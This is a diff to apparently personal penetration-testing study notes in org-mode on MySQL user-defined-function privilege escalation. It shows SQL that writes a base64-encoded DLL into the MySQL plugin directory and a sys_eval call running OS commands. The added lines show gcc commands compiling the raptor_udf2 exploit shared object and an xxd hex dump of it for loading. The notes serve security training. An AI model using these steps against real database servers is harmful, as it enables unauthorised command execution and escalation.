@@ -3332,7 +3332,7 @@ select
 from_base64("TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... ")
 into dumpfile "D:\\MySQL\\mysql-5.7.21-winx64\\mysql-5.7.21-
 winx64\\lib\\plugin\\udf.dll";
-/* Q: ref p9 the modified dll content? */
+/* Q: ref p9 the modified dll content? binary-walk */
       #+end_src
 
     + src basic-enum:
@@ -3373,8 +3373,28 @@ drop function sys_eval;
 select sys_eval('dir');
      #+end_src
 
-**** the PWK way. 
-     // continue p785
+**** the PWK way.
+     + ref:
+       - about .so shared libraries, soname, etc. [[https://tldp.org/HOWTO/Program-Library-HOWTO/shared-libraries.html][shared-libraries]]
+     + info:
+       - regarding to the unknown binary, the exploit referenced [[https://www.exploit-db.com/exploits/1518]]
+       - compile the .so file, in which exists a do_system(...) function. pull necessary dependencies and compile.
+       #+begin_src sh
+gcc -g -c raptor_udf2.c
+gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+  ## gcc options:
+  ## ref: man 1 gcc (gcc-doc)
+  ## ref: [[https://man7.org/linux/man-pages/man1/gcc.1.html][man 1 gcc]]
+  ## -g: Produce debugging information in the operating system's native format (stabs, COFF, XCOFF, or DWARF). GDB can work with this debugging information.
+  ## -c: run no linker
+  ## -shared: (linker option) produce a shared object which can then be linked with other object to form an executable.
+  ## -Wl,options...: Pass a comma separated option-list to the linker.
+  ## -Wall: This enables all the warnings about constructions that some users consider questionable, and that are easy to avoid (or modify to prevent the warning), even in conjunction with macros. This also enables some language-specific warnings described in C++ Dialect Options and ...
+       #+end_src
+       - hex dump the shared object into the plugin directory
+       #+begin_src sh
+xxd -ps raptor_udf2.so 
+       #+end_src
 
 
 * TODO list
